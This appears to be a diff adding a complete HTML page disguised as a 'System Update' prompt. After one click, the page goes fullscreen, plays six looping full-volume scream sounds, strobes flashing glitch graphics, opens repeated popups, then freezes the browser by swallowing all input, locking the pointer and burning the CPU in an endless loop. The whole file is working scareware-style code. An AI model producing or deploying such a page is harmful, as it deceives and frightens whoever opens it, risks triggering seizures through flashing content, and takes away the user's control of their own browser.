@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Update</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    width: 100%; height: 100%; overflow: hidden;
+    background: #000; cursor: none;
+    user-select: none; -webkit-user-select: none;
+  }
+  #mainGif {
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    object-fit: cover; z-index: 1;
+    pointer-events: none;
+    filter: contrast(1.5) saturate(1.7);
+    display: none;
+  }
+  #glitchCanvas {
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    z-index: 10; pointer-events: none;
+    mix-blend-mode: screen;
+    display: none;
+  }
+  .popupClone {
+    position: fixed;
+    border: 3px solid #f00;
+    box-shadow: 0 0 25px #f00, 0 0 50px #0ff;
+    z-index: 5;
+    pointer-events: none;
+    animation: shake 0.06s infinite;
+  }
+  .popupClone img {
+    width: 100%; height: 100%;
+    object-fit: cover; display: block;
+  }
+  @keyframes shake {
+    0%   { transform: translate(0,0) rotate(0deg); }
+    25%  { transform: translate(5px,-5px) rotate(1.2deg); }
+    50%  { transform: translate(-5px,5px) rotate(-1.2deg); }
+    75%  { transform: translate(3px,2px) rotate(0.6deg); }
+    100% { transform: translate(0,0) rotate(0deg); }
+  }
+  #startOverlay {
+    position: fixed; inset: 0;
+    background: #000; z-index: 100;
+    display: flex; align-items: center; justify-content: center;
+    color: #0f0; font-family: monospace; font-size: 22px;
+    cursor: pointer; text-align: center; padding: 20px;
+  }
+</style>
+</head>
+<body>
+  <div id="startOverlay">CLICK ANYWHERE TO CONTINUE SYSTEM UPDATE</div>
+  <img id="mainGif" src="https://i.pinimg.com/originals/31/f0/27/31f027409133684d3970d69340c4fcea.gif" alt="">
+  <canvas id="glitchCanvas"></canvas>
+
+<script>
+const GIF   = "https://i.pinimg.com/originals/31/f0/27/31f027409133684d3970d69340c4fcea.gif";
+const AUDIO = "https://www.myinstants.com/media/sounds/five-nights-at-freddys-full-scream-sound_2.mp3";
+
+let started = false;
+const canvas = document.getElementById("glitchCanvas");
+const ctx = canvas.getContext("2d");
+let w, h, frame = 0;
+const loopers = [];
+
+function resize() {
+  w = canvas.width  = window.innerWidth;
+  h = canvas.height = window.innerHeight;
+}
+window.addEventListener("resize", resize);
+resize();
+
+/* visual layer */
+function drawGlitch() {
+  frame++;
+  ctx.clearRect(0, 0, w, h);
+
+  ctx.fillStyle = "rgba(0,255,40,0.06)";
+  for (let y = 0; y < h; y += 3) ctx.fillRect(0, y, w, 1);
+
+  if (frame % 3 < 2) {
+    ctx.globalCompositeOperation = "lighter";
+    ctx.fillStyle = "rgba(255,0,0,0.12)";
+    ctx.fillRect(5, 0, w, h);
+    ctx.fillStyle = "rgba(0,255,255,0.12)";
+    ctx.fillRect(-5, 0, w, h);
+    ctx.globalCompositeOperation = "source-over";
+  }
+
+  for (let i = 0; i < 80; i++) {
+    const x = Math.random() * w, y = Math.random() * h;
+    ctx.fillStyle = `rgba(${Math.floor(Math.random()*255)},${Math.floor(Math.random()*50)},${Math.floor(Math.random()*255)},${Math.random()*0.8+0.15})`;
+    ctx.fillRect(x, y, Math.random()*150+5, Math.random()*32+2);
+  }
+
+  for (let i = 0; i < 16; i++) {
+    const y = Math.random() * h;
+    ctx.fillStyle = `rgba(${Math.random()>0.5?255:0},${Math.random()>0.5?0:255},${Math.random()>0.5?255:0},${Math.random()*0.6+0.2})`;
+    ctx.fillRect(0, y, w, Math.random()*14+1);
+  }
+
+  for (let i = 0; i < 10; i++) {
+    ctx.fillStyle = `rgba(0,255,255,${Math.random()*0.45})`;
+    ctx.fillRect(Math.random()*w, 0, Math.random()*16+1, h);
+  }
+
+  if (Math.random() < 0.05) {
+    ctx.globalCompositeOperation = "difference";
+    ctx.fillStyle = "rgba(255,255,255,0.35)";
+    ctx.fillRect(0, 0, w, h);
+    ctx.globalCompositeOperation = "source-over";
+  }
+
+  if (frame % 4 === 0) {
+    const sy = Math.floor(Math.random()*h), sh = Math.floor(Math.random()*55+10);
+    const dx = Math.floor(Math.random()*60-30);
+    try { ctx.putImageData(ctx.getImageData(0, sy, w, sh), dx, sy); } catch(e){}
+  }
+
+  for (let i = 0; i < 120; i++) {
+    ctx.fillStyle = Math.random() > 0.5 ? "#fff" : "#0f0";
+    ctx.fillRect(Math.random()*w, Math.random()*h, 2, 2);
+  }
+
+  requestAnimationFrame(drawGlitch);
+}
+
+function spawnClone() {
+  const div = document.createElement("div");
+  div.className = "popupClone";
+  const size = 140 + Math.random() * 280;
+  div.style.width  = size + "px";
+  div.style.height = (size * 0.75) + "px";
+  div.style.left   = Math.random() * (window.innerWidth  - size) + "px";
+  div.style.top    = Math.random() * (window.innerHeight - size) + "px";
+  const img = document.createElement("img");
+  img.src = GIF;
+  div.appendChild(img);
+  document.body.appendChild(div);
+  setTimeout(() => div.remove(), 2800 + Math.random() * 2200);
+}
+
+function tryPopup() {
+  try {
+    const win = window.open("", "_blank",
+      `width=${150+Math.random()*320},height=${110+Math.random()*260},left=${Math.random()*700},top=${Math.random()*400}`);
+    if (win) {
+      win.document.write(`<html><body style="margin:0;background:#000;overflow:hidden">
+        <img src="${GIF}" style="width:100%;height:100%;object-fit:cover"></body></html>`);
+      win.document.close();
+    }
+  } catch(e) {}
+}
+
+/* start multiple looping screams on the user click – they keep going after freeze */
+function startLoopingScreams() {
+  for (let i = 0; i < 6; i++) {
+    const a = new Audio(AUDIO);
+    a.loop = true;
+    a.volume = 1;
+    a.play().catch(()=>{});
+    loopers.push(a);
+  }
+  // staggered extra non-loop ones for denser overlap at the start
+  for (let i = 0; i < 4; i++) {
+    setTimeout(() => {
+      const a = new Audio(AUDIO);
+      a.volume = 1;
+      a.play().catch(()=>{});
+    }, i * 120);
+  }
+}
+
+/* hard freeze – lighter burn so audio thread survives */
+function lockEverything() {
+  const kill = e => {
+    e.preventDefault();
+    e.stopPropagation();
+    e.stopImmediatePropagation();
+    return false;
+  };
+  const events = [
+    "click","dblclick","mousedown","mouseup","mousemove","mouseover","mouseout",
+    "pointerdown","pointerup","pointermove","pointercancel",
+    "touchstart","touchmove","touchend","touchcancel",
+    "keydown","keyup","keypress",
+    "contextmenu","wheel","scroll","selectstart","dragstart","drop"
+  ];
+  events.forEach(ev => {
+    window.addEventListener(ev, kill, true);
+    document.addEventListener(ev, kill, true);
+    document.body.addEventListener(ev, kill, true);
+  });
+
+  try { document.body.requestPointerLock(); } catch(e) {}
+
+  // still freezes input hard, but less aggressive so audio keeps playing
+  function burn() {
+    let x = 0;
+    for (let i = 0; i < 3e7; i++) x += Math.sin(i);
+    setTimeout(burn, 0);
+  }
+  burn();
+
+  function rafFlood() {
+    requestAnimationFrame(rafFlood);
+  }
+  rafFlood();
+}
+
+function startPrank() {
+  if (started) return;
+  started = true;
+
+  const overlay = document.getElementById("startOverlay");
+  if (overlay) overlay.remove();
+
+  document.getElementById("mainGif").style.display = "block";
+  document.getElementById("glitchCanvas").style.display = "block";
+
+  const el = document.documentElement;
+  if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
+  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+  // start the looping screams FIRST while we still have the user gesture
+  startLoopingScreams();
+
+  // visuals
+  drawGlitch();
+  setInterval(spawnClone, 220);
+  for (let i = 0; i < 12; i++) setTimeout(spawnClone, i * 50);
+  setInterval(tryPopup, 800);
+  for (let i = 0; i < 7; i++) setTimeout(tryPopup, i * 100);
+
+  const main = document.getElementById("mainGif");
+  setInterval(() => {
+    main.style.transform = `translate(${(Math.random()-0.5)*18}px,${(Math.random()-0.5)*14}px)`;
+  }, 35);
+
+  // freeze a moment later – audio is already looping by itself
+  setTimeout(lockEverything, 600);
+}
+
+document.getElementById("startOverlay").addEventListener("click", startPrank);
+document.addEventListener("keydown", startPrank, { once: true });
+</script>
+</body>
+</html>
